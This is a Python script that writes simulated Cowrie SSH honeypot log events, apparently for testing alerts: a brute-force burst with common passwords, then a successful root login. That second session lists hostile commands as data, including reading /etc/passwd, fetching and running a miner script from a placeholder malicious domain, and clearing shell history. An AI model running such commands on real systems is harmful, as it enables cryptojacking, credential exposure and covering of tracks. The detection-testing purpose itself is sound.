import json
import time
import random
import uuid
from datetime import datetime, timezone

LOG_FILE = "cowrie.json"

def generate_timestamp():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

def append_event(event_data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(event_data) + "\n")
    print(f"[{event_data['timestamp']}] Generated {event_data['eventid']} from {event_data.get('src_ip')}")

def simulate_brute_force():
    src_ip = f"192.168.1.{random.randint(10, 250)}"
    session_id = uuid.uuid4().hex[:12]
    
    print(f"\n--- Simulating SSH Brute Force from {src_ip} ---")
    
    # 1. Connection
    append_event({
        "eventid": "cowrie.session.connect",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "src_port": random.randint(30000, 60000),
        "dst_ip": "10.0.0.5",
        "dst_port": 22
    })
    time.sleep(1)
    
    # 2. Client version
    append_event({
        "eventid": "cowrie.client.version",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "version": "SSH-2.0-libssh-0.6.3"
    })
    time.sleep(1)

    # 3. Multiple failed logins (will trigger alert)
    for _ in range(6):
        append_event({
            "eventid": "cowrie.login.failed",
            "timestamp": generate_timestamp(),
            "session": session_id,
            "src_ip": src_ip,
            "username": "root",
            "password": random.choice(["root", "admin", "123456", "password", "toor"])
        })
        time.sleep(1)
        
    # 4. Disconnect
    append_event({
        "eventid": "cowrie.session.closed",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "duration": 7.5
    })
    time.sleep(2)

def simulate_successful_intrusion():
    src_ip = f"203.0.113.{random.randint(1, 250)}"
    session_id = uuid.uuid4().hex[:12]
    
    print(f"\n--- Simulating Successful Intrusion & Command Execution from {src_ip} ---")
    
    append_event({
        "eventid": "cowrie.session.connect",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "src_port": random.randint(30000, 60000)
    })
    time.sleep(1)
    
    append_event({
        "eventid": "cowrie.login.success",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "username": "root",
        "password": "password"
    })
    time.sleep(1)

    commands = [
        "whoami",
        "uname -a",
        "cat /etc/passwd",  # Will trigger alert
        "wget http://malicious-domain.com/miner.sh -O /tmp/miner.sh",
        "chmod +x /tmp/miner.sh",
        "/tmp/miner.sh &",
        "history -c"
    ]
    
    for cmd in commands:
        append_event({
            "eventid": "cowrie.command.input",
            "timestamp": generate_timestamp(),
            "session": session_id,
            "src_ip": src_ip,
            "input": cmd
        })
        time.sleep(2)
        
    append_event({
        "eventid": "cowrie.session.closed",
        "timestamp": generate_timestamp(),
        "session": session_id,
        "src_ip": src_ip,
        "duration": 15.0
    })

if __name__ == "__main__":
    print("Starting Attack Simulation...")
    simulate_brute_force()
    time.sleep(3)
    simulate_successful_intrusion()
    print("Simulation Complete!")
